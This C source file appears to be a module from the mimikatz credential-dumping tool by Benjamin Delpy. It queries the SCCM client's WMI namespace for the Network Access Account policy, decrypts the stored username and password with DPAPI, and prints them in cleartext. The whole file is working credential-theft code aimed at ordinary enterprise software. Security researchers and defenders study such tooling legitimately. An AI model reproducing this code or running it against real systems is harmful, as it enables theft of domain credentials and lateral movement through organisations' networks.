/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_sccm.h"

NTSTATUS kuhl_m_dpapi_sccm_networkaccessaccount(int argc, wchar_t * argv[])
{
	IWbemLocator *pLoc = NULL;
	IWbemServices *pSvc = NULL;
	IEnumWbemClassObject* pEnumerator = NULL;
	IWbemClassObject *pclsObj = NULL;
	ULONG uReturn = 0;
	VARIANT vtGeneric;
	HRESULT hr, hrEnum;

	PSCCM_Policy_Secret pPolicySecret;
	DWORD cbPolicySecret;
	LPVOID pDataOut;
	DWORD dwDataOutLen;
	ULONGLONG ullLastUpdate;

	hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *) &pLoc);
	if(hr == S_OK)
	{
		hr = IWbemLocator_ConnectServer(pLoc, L"root\\ccm\\Policy\\Machine\\RequestedConfig", NULL, NULL, NULL, 0, NULL, NULL, &pSvc); // ActualConfig
		if(hr == S_OK)
		{
			hr = CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
			if(hr == S_OK)
			{
				hr = IWbemServices_ExecQuery(pSvc, L"WQL", L"SELECT * FROM CCM_NetworkAccessAccount", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
				if(hr == S_OK)
				{
					do
					{
						hrEnum = IEnumWbemClassObject_Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn);
						if(hrEnum == S_OK)
						{
							kprintf(L"\n");
							if(uReturn)
							{
								hr = IWbemClassObject_Get(pclsObj, L"PolicyID", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									kprintf(L"PolicyID      : %s\n", vtGeneric.bstrVal);
									VariantClear(&vtGeneric);
								}

								hr = IWbemClassObject_Get(pclsObj, L"PolicyVersion", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									kprintf(L"PolicyVersion : %s\n", vtGeneric.bstrVal);
									VariantClear(&vtGeneric);
								}

								hr = IWbemClassObject_Get(pclsObj, L"PolicySource", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									kprintf(L"PolicySource  : %s\n", vtGeneric.bstrVal);
									VariantClear(&vtGeneric);
								}

								hr = IWbemClassObject_Get(pclsObj, L"LastUpdateTime", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									ullLastUpdate = _wcstoui64(vtGeneric.bstrVal, NULL, 10);
									kprintf(L"LastUpdateTime: ");
									kull_m_string_displayLocalFileTime((PFILETIME) &ullLastUpdate);
									kprintf(L"\n");
									VariantClear(&vtGeneric);
								}

								hr = IWbemClassObject_Get(pclsObj, L"NetworkAccessUsername", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									kprintf(L"DPAPI Username: %s\n", vtGeneric.bstrVal);
									if(kuhl_m_dpapi_sccm_XML_Data_to_bin(vtGeneric.bstrVal, &pPolicySecret, &cbPolicySecret))
									{
										if(kuhl_m_dpapi_unprotect_raw_or_blob(pPolicySecret->data, pPolicySecret->cbData, NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
										{
											kprintf(L"Clear Username: %.*s\n", dwDataOutLen / sizeof(wchar_t), pDataOut);
											LocalFree(pDataOut);
										}
										LocalFree(pPolicySecret);
									}
									VariantClear(&vtGeneric);
								}
								else PRINT_ERROR(L"IWbemClassObject_Get(NetworkAccessUsername): 0x%08x\n", hr);

								hr = IWbemClassObject_Get(pclsObj, L"NetworkAccessPassword", 0, &vtGeneric, 0, 0);
								if(hr == S_OK)
								{
									kprintf(L"DPAPI Password: %s\n", vtGeneric.bstrVal);
									if(kuhl_m_dpapi_sccm_XML_Data_to_bin(vtGeneric.bstrVal, &pPolicySecret, &cbPolicySecret))
									{
										if(kuhl_m_dpapi_unprotect_raw_or_blob(pPolicySecret->data, pPolicySecret->cbData, NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
										{
											kprintf(L"Clear Password: %.*s\n", dwDataOutLen / sizeof(wchar_t), pDataOut);
											LocalFree(pDataOut);
										}
										LocalFree(pPolicySecret);
									}
									VariantClear(&vtGeneric);
								}
								else PRINT_ERROR(L"IWbemClassObject_Get(NetworkAccessPassword): 0x%08x\n", hr);

								IWbemClassObject_Release(pclsObj);
							}
							else PRINT_ERROR(L"no return?\n");
						} 
						else if(hrEnum != S_FALSE) PRINT_ERROR(L"IEnumWbemClassObject_Next: 0x%08x\n", hrEnum);

					} while(hrEnum == S_OK);

					IEnumWbemClassObject_Release(pEnumerator);
				}
				else PRINT_ERROR(L"IWbemServices_ExecQuery: 0x%08x\n", hr);
			}
			else PRINT_ERROR(L"CoSetProxyBlanket: 0x%08x\n", hr);

			IWbemServices_Release(pSvc);
		}
		else PRINT_ERROR(L"IWbemLocator_ConnectServer: 0x%08x\n", hr);

		IWbemLocator_Release(pLoc);
	}
	else PRINT_ERROR(L"CoCreateInstance: 0x%08x\n", hr);

	return STATUS_SUCCESS;
}

BOOL kuhl_m_dpapi_sccm_XML_Data_to_bin(BSTR szData, PSCCM_Policy_Secret * ppPolicySecret, PDWORD pcbPolicySecret)
{
	BOOL status = FALSE;
	wchar_t *ptrBegin, *ptrEnd;
	DWORD cbChar;

	ptrBegin = wcsstr(szData, L"<PolicySecret Version=\"1\"><![CDATA[");
	if(ptrBegin == szData)
	{
		ptrBegin += 35;
		ptrEnd = wcsstr(ptrBegin, L"]]></PolicySecret>");
		if(ptrEnd)
		{
			cbChar = (DWORD) (ptrEnd - ptrBegin);
			status = kull_m_crypto_StringToBinaryW(ptrBegin, cbChar, CRYPT_STRING_HEX, (PBYTE *) ppPolicySecret, pcbPolicySecret);
		}
		else PRINT_ERROR(L"Unable to find end\n");
	}
	else PRINT_ERROR(L"Unable to find begin\n");

	return status;
}